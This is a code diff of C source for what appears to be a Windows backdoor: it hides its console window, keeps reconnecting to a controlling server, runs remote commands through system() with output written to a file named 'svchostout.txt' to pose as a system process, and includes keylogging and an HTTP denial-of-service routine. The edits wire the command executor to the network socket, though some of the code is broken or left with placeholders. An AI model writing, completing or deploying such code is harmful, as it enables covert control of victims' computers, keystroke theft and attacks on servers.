@@ -15,9 +15,11 @@ int create_conn(int sock, char *server_ip, int server_port){
 	server.sin_family = AF_INET;
 	server.sin_port = htons( server_port );
 	int ris;
-	do{                                                     //always try to connect
+	do{
+        //always try to connect
 		ris=connect(sock , (struct sockaddr *)&server , sizeof(server));
 	}while(ris<0);
+	printf("\nConnected");
     return ris;
 
  }
@@ -28,15 +30,14 @@ void hostname_to_ip(char *address, char *ip){
 	struct in_addr **addr_list;
 	he = gethostbyname(address);
 	if (he==NULL){
-	   //Gethostbynae failed
-		printf("\n Get host failed");
+    exit(0);
 	}
 	 addr_list = (struct in_addr **) he -> h_addr_list;
 	 for(i=0; addr_list[i]!=NULL; i++){
 		strcpy(ip, inet_ntoa(*addr_list[i]));
 	 }
 	}
-//Function that hide the console
+//Function that hides the console
 void stealth(){
 
 	HWND st;                                                //Handle to a window
@@ -94,7 +95,7 @@ void hdos_exe(char *address){
 	char server_reply[256];
 	if((sock_dos = socket(AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET)                   	//Create socket
 	{
-		printf("Could not create socket : %d" , WSAGetLastError());
+		exit(0);
 	}
 
 	if(isalpha(address[0])){                    //Ex: address=ww.xyz.com
@@ -106,7 +107,8 @@ void hdos_exe(char *address){
 	//HTTP REQUEST
 	send(sock_dos, "GET /\r\n", strlen("GET /\r\n"),0);
 	//Risposta
-	//recv(sock_dos,server_ris,512,0);
+	recv(sock_dos,server_ris,512,0);
+	printf("\n Server Ris: %s",server_ris);
 
 }
 
@@ -248,15 +250,15 @@ int get_keylog(){
 	}
 }
 
-int exec_command(char *bufs, char *command)
+int exec_command(char *command, int sock)
 {
     char *var=">svchostout.txt";
     char *result = malloc(strlen(command)+strlen(var)+1);//+1 for the null-terminator
-    //in real code you would check for errors in malloc here
+
     char symbol;
-    int i;
     strcpy(result, command);
     strcat(result, var);
+    printf("\n command: %s",result);
     system(result);
     FILE *fp = fopen("svchostout.txt", "r");
     if(fp != NULL)
@@ -264,16 +266,14 @@ int exec_command(char *bufs, char *command)
         printf("I'm here");
         while((symbol = getc(fp)) != EOF)
         {
-
-            bufs[i]=symbol;
-            i++;
+            send(sock,"eieiei",strlen("eieiei"),0);
         }
-        bufs[i++]='\0';
         fclose(fp);
     }
     else{return 0; }    //Error
     //printf("%s",buf);
     system("del svchostout.txt");
+    //*bufs=buf;
     return 1; //success
 }
 
